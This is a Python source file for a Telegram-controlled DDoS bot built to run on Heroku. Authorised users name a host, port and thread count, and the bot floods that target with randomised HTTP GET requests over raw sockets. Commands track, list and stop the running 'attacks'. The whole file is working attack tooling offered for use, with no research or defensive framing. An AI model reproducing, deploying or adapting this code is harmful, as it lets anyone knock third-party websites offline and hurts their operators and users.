#!/usr/bin/env python3
"""
TG-DDOS-BOT — Heroku-safe version.
Only HTTP flood works (no root, no raw sockets).
"""
import os
import sys
import time
import random
import socket
import threading
import logging
from flask import Flask, request

import telebot
from telebot import types

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
TOKEN = os.environ.get("TG_BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.environ.get("TG_ADMIN_IDS", "").split(",") if x}
PORT = int(os.environ.get("PORT", 8443))
APP_URL = os.environ.get("APP_URL", "")  # e.g. https://yourapp.herokuapp.com

STOP_EVENTS = {}
ACTIVE_THREADS = {}
STATE_LOCK = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("bot")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def admin_only(func):
    def wrapper(message, *args, **kwargs):
        if not is_admin(message.from_user.id):
            bot.reply_to(message, "⛔ unauthorized")
            return
        return func(message, *args, **kwargs)
    return wrapper


# ─────────────────────────────────────────────────────────────
# HTTP FLOOD (only working method on Heroku)
# ─────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

METHODS_PATHS = ["/", "/index.html", "/api", "/wp-login.php", "/search?q=x"]


def http_flood(host, port, stop_event, stats, use_https=False):
    path_pool = METHODS_PATHS
    while not stop_event.is_set():
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((host, port))
            ua = random.choice(USER_AGENTS)
            path = random.choice(path_pool)
            rand = random.randint(0, 9999999)
            req = (
                f"GET {path}?{rand} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            try:
                s.recv(2048)
            except Exception:
                pass
            s.close()
            stats["pkts"] += 1
        except Exception:
            time.sleep(0.05)


# ─────────────────────────────────────────────────────────────
# MANAGER
# ─────────────────────────────────────────────────────────────
def launch_http(host, port, threads, chat_id):
    key = f"{chat_id}:http:{host}:{port}"
    with STATE_LOCK:
        if key in STOP_EVENTS:
            return None, "already running"
        stop_event = threading.Event()
        STOP_EVENTS[key] = stop_event
        stats = {"pkts": 0, "start": time.time(), "threads": threads}

    def worker():
        http_flood(host, port, stop_event, stats)

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ACTIVE_THREADS.setdefault(key, []).append(t)

    return key, None


def stop(key):
    with STATE_LOCK:
        ev = STOP_EVENTS.pop(key, None)
        ACTIVE_THREADS.pop(key, None)
    if ev:
        ev.set()
    return ev is not None


def stop_all():
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    for k in keys:
        stop(k)
    return keys


# ─────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
@admin_only
def cmd_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📊 Active", "🛑 Stop All")
    bot.send_message(
        message.chat.id,
        "TG-DDOS (Heroku edition)\n\n"
        "Only HTTP flood works here — no raw sockets on Heroku.\n\n"
        "Commands:\n"
        "  /http <host> [port] [threads]\n"
        "  /active\n"
        "  /stop <key>\n"
        "  /stopall\n",
        reply_markup=markup,
    )


@bot.message_handler(commands=["http"])
@admin_only
def cmd_http(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "usage: /http <host> [port] [threads]")
        return

    host = parts[1].replace("http://", "").replace("https://", "").split("/")[0]
    if ":" in host:
        host, _, port_s = host.partition(":")
        port = int(port_s)
    else:
        port = int(parts[2]) if len(parts) > 2 else 80

    threads = int(parts[3]) if len(parts) > 3 else 50
    threads = max(1, min(200, threads))

    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        bot.reply_to(message, f"cannot resolve: {host}")
        return

    key, err = launch_http(ip, port, threads, message.chat.id)
    if err:
        bot.reply_to(message, f"error: {err}")
        return

    bot.reply_to(
        message.chat.id,
        f"🚀 http → {ip}:{port}  threads={threads}\nkey: <code>{key}</code>",
        parse_mode="HTML",
    )


@bot.message_handler(commands=["active"])
@admin_only
def cmd_active(message):
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    if not keys:
        bot.reply_to(message, "no active attacks")
        return
    lines = ["<b>Active</b>"]
    for k in keys:
        lines.append(f"<code>{k}</code>")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["stop"])
@admin_only
def cmd_stop(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "usage: /stop <key>")
        return
    ok = stop(parts[1].strip())
    bot.reply_to(message, "stopped" if ok else "key not found")


@bot.message_handler(commands=["stopall"])
@admin_only
def cmd_stopall(message):
    keys = stop_all()
    bot.reply_to(message, f"stopped {len(keys)}")


@bot.message_handler(func=lambda m: m.text == "📊 Active")
@admin_only
def kb_active(message):
    cmd_active(message)


@bot.message_handler(func=lambda m: m.text == "🛑 Stop All")
@admin_only
def kb_stopall(message):
    cmd_stopall(message)


# ─────────────────────────────────────────────────────────────
# WEBHOOK
# ─────────────────────────────────────────────────────────────
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
        bot.process_new_updates([update])
        return "ok", 200
    return "forbidden", 403


@app.route("/", methods=["GET"])
def health():
    return "bot alive", 200


def set_webhook():
    if not APP_URL:
        log.warning("APP_URL not set — using polling")
        bot.remove_webhook()
        bot.infinity_polling(timeout=30, long_polling_timeout=25)
        return

    bot.remove_webhook()
    time.sleep(0.5)
    url = f"{APP_URL}/{TOKEN}"
    bot.set_webhook(url=url)
    log.info(f"webhook set: {url}")


if __name__ == "__main__":
    if not TOKEN:
        print("[!] TG_BOT_TOKEN missing")
        sys.exit(1)
    if not ADMIN_IDS:
        print("[!] TG_ADMIN_IDS missing")
        sys.exit(1)

    set_webhook()
    if APP_URL:
        app.run(host="0.0.0.0", port=PORT)
    else:
        # polling already runs inside set_webhook
        while True:
            time.sleep(60)
